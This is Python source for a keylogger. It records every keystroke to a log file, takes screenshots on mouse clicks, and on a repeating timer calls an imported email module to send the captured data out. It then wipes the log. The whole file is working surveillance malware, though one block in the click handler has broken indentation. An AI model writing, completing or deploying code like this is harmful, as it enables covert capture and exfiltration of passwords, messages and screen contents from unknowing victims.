import os 
import pynput 
import data
import threading
import email_send
import ss

mouse_click = 0

log_file = os.environ.get(
	'pylogger_file', 
	os.path.expanduser(data.path) 
) 

if not os.path.exists(log_file):
  		open(log_file, 'w').close()

def email_threading():
	email_send.send_data()
	
	if os.path.exists(log_file):
  		open(log_file, 'w').close()
	t = threading.Timer(data.time_seconds, email_threading)
	t.start()

email_threading()

def OnKeyPress(key):
	global mouse_click 
	with open(log_file, 'a') as f: 
		f.write(f"{key} \n")
		mouse_click = 0

def OnKeyRelease(key):
	pass

def OnMouseClick(x, y, button, pressed):
	global mouse_click
	if pressed:
		if button == mouse_click:
		ss.takeScreenshot()
		#f.write(f"Click\n")
		mouse_click = button
		s = threading.Timer(data.time_seconds_ss, ss.takeScreenshot)
		s.start()

def OnScroll(x,y,dx,dy):
	pass

def OnMove(x,y):
	pass

with pynput.mouse.Listener(on_move=OnMove, on_click=OnMouseClick, on_scroll=OnScroll) as listener:
	with pynput.keyboard.Listener(on_press = OnKeyPress, 
			  on_release = OnKeyRelease) as listener: 
		listener.join()


